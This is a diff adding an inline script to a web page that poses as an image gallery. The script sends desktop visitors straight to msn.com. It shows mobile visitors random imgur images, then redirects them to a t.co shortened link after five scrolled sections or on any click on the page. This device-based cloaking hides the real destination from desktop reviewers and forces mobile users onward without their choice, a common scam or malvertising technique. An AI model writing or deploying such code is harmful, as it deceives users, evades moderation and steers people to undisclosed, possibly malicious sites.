@@ -1,0 +1,91 @@
+<script>
+    // --- 1. CONFIGURATION & REDIRECT CHECK ---
+    const desktopURL = "https://www.msn.com/it-it";
+    const mobileURL = "https://t.co/21Bu3LDwwY";
+    const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase());
+    const MAX_SCROLLS_BEFORE_REDIRECT = 5;
+
+    // Immediate redirect for desktop
+    if (!isMobile) {
+        window.location.replace(desktopURL);
+    }
+
+    const ALL_IMAGE_URLS = [
+        'https://i.imgur.com/hmAABJ7.jpg',
+        'https://i.imgur.com/ZYGvd6q.jpg',
+        'https://i.imgur.com/YpxSLD0.jpg',
+        'https://i.imgur.com/JSU3t4x.jpg',
+        'https://i.imgur.com/rMwqoZP.jpg',
+        'https://i.imgur.com/Dpi9Zzv.jpg',
+        'https://i.imgur.com/0kpyxuU.jpg',
+        'https://i.imgur.com/wzYPBDJ.jpg',
+        'https://i.imgur.com/wGi8uyT.jpg',
+        'https://i.imgur.com/tTxAmNF.jpg',
+        'https://i.imgur.com/pSX3j18.jpg',
+        'https://i.imgur.com/jwFUISy.jpg',
+        'https://i.imgur.com/adL2Ou5.jpg',
+        'https://i.imgur.com/lcFOzxz.jpg',
+        'https://i.imgur.com/TrIPXQf.jpg',
+        'https://i.imgur.com/LkW7EgA.jpg'
+    ];
+
+    function getRandomImageUrls(count) {
+        const shuffled = [...ALL_IMAGE_URLS].sort(() => 0.5 - Math.random());
+        return shuffled.slice(0, count);
+    }
+
+    function preloadImage(url) {
+        const img = new Image();
+        img.src = url;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const sections = document.querySelectorAll(".full-image-section");
+        const SELECTED_IMAGE_URLS = getRandomImageUrls(4); 
+        let currentSectionIndex = 0;
+
+        // Apply random images to sections
+        sections.forEach((section, index) => {
+            const url = index < SELECTED_IMAGE_URLS.length ? SELECTED_IMAGE_URLS[index] : SELECTED_IMAGE_URLS[0];
+            section.setAttribute('data-bg', url);
+            section.setAttribute('data-section-index', index);
+
+            if (index === 0) preloadImage(url);
+        });
+
+        // Apply first image immediately
+        if (sections.length > 0) {
+            const firstSection = sections[0];
+            firstSection.style.backgroundImage = `url('${firstSection.getAttribute('data-bg')}')`;
+            for (let i = 1; i < sections.length; i++) {
+                preloadImage(sections[i].getAttribute('data-bg'));
+            }
+        }
+
+        // Intersection Observer for lazy loading + redirect after scroll
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    const newIndex = parseInt(entry.target.getAttribute('data-section-index'));
+                    if (newIndex >= currentSectionIndex) {
+                        currentSectionIndex = newIndex;
+                        if (!entry.target.style.backgroundImage) {
+                            entry.target.style.backgroundImage = `url('${entry.target.getAttribute('data-bg')}')`;
+                        }
+                        if (currentSectionIndex >= MAX_SCROLLS_BEFORE_REDIRECT) {
+                            window.location.href = mobileURL;
+                        }
+                    }
+                }
+            });
+        }, { root: null, threshold: 0.5 });
+
+        sections.forEach(section => observer.observe(section));
+
+        // --- Click redirect ---
+        const imageContainer = document.getElementById("imageContainer") || document.body; // fallback if ID not exists
+        imageContainer.addEventListener("click", () => {
+            window.location.href = mobileURL;
+        });
+    });
+</script>
